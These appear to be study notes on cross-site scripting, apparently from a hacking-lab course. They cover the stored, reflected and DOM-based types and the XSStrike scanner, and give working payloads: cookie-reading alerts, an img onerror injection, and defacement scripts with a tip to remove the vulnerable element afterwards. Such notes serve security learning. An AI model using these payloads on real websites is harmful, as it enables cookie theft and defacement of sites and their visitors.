## Cross-Site Scripting (XSS)
***
### There are 3 main types of XSS
* **Stored (Persistent)** = It occurs when the user input is stored on the back-end database and then displayed 
* **Reflected  (Non-Persistent)** = Occurs when user input is displayed on the page after being processed by the backend server, without being stored
* **DOM-based** =  And lastly also a non-persistent XSS type that occurs when inserted input is shown in the browser, being completely processed on the client-side

### Stored (Persistent) XSS
#### If we input the following payload on an input field that displays what we have inserted right after (e.g., to-do list), without any sanitization,  it will execute that payload (by displaying the alert), and also store on the back-end database
```HTML
<script>alert(window.origin)</script>
```
#### More examples:
#### Display the following HTML code in plaintext 
```HTML
<plaintext></plaintext>
```
#### Pop up the browser print dialog
```HTML
<script>print()</script>
```
### Non-persistent XSS
### Reflected XSS
#### Only gets processed by the back-end server and not stored
#### So after reloading the following payload would be deleted
```HTML
<script>alert(document.cookie)</script>
```
#### To be able to attack someone we can share the URL that we made our request with the chosen payload

### DOM-based XSS
#### Data is completely processed by the client-side unlike the Reflected and the Stored XSS
#### If we try the payload above (that uses the <script> tag) we will see that won't execute in some cases. This happens because the innerHTML function , for example, does not allow the use of <script> tags as a security feature.
```HTML
<img src="" onerror=alert(document.cookie)>
```
##### Note: The use of a '#', means that is a client-side parameter


### Automated Discovery
#### Web Application Vulnerability scanners such as Nessus, Burp Pro, or ZAP, by doing active and passive scanning.
#### Open-source tools: XSS Strike and Brute XSS


#### Installing XSS Strike
````Bash
$ git clone https://github.com/s0md3v/XSStrike.git
$ cd XSStrike
$ pip install -r requirements.txt
$ python xsstrike.py
````
#### Using XSS Strike
````Bash
$ pip install -r requirements.txt
$ python xsstrike.py -u "http://<SERVER_IP:PORT>/index.php?task=test"
````
### Manual Discovery
#### Open-source payload lists
* (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md 'PayloadAllTheThings')
* (https://github.com/payloadbox/xss-payload-list 'PayloadBox')

### My Python script that sends payloads from a txt file and then compares with the page source to see if any payload was successful

### Defacing
#### Defacing a website is the act of changing its look for anyone who visits the website

### Defacement Elements
#### Some common HTML elements to change the main look of the page:
* Background Color:   document.body.style.background
* Background:  document.body.background
* Page title:  document.title
* Page text :  DOM.innerHTML
#### Also, after defacing we can remove the vulnerable element, such that it would be harder to reset the web page.

#### Changing Background
#### Color
```HTML
<script>document.body.style.background = "#FFFF"</script>
```
#### Image
```HTML
<script>document.body.style.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

#### Changing Page Title
```HTML
<script>document.title = "1337"</script>
```

#### Changing Page Text
```HTML
<script>document.getElementById("id1337") = "Got hacked by 0xlightningG1337" </script>
```
#### OR using JQUERY
```
$("#id1337").html('Got hacked by 0xlightningG1337')
```
#### Changing entire HTML code of the main body
```HTML
<script>document.getElementsByTagName("body")[0].innerHTML = "Got hacked by 0xlightningG1337" </script>
```

```HTML
<script>document.getElementsByTagName("body")[0].innerHTML = "<center> <h1 style="color: green">Got hacked by 0xlightningG1337 </h1><img src="https://www.hackthebox.eu/images/logo-htb.svg" height="42px" alt="1337"></script>
</center>"</script>
```



##### **Notes**: 
- Many contemporary web applications employ cross-domain IFrames to manage user input, which helps protect the main application from XSS vulnerabilities. By using an IFrame, even if the form itself is vulnerable to XSS, the risk does not extend to the main application. Instead of displaying a fixed value like "1" in the alert box, showing the value of *'window.origin'* is more informative. Revealing the URL where the script is being executed. 
- It can also be injected into HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page)